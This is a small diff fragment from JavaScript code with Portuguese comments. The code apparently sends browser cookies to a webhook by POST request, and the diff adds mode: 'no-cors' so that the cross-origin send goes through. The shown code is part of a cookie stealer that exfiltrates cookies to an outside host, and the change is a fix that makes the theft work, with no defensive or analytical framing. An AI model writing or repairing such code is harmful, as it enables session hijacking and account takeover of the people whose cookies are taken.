@@ -11,6 +11,7 @@
     // Enviar os cookies para o webhook
     fetch(webhookUrl, {
         method: 'POST',
+        mode: 'no-cors', // Adicionado
         headers: {
             'Content-Type': 'application/json',
         },
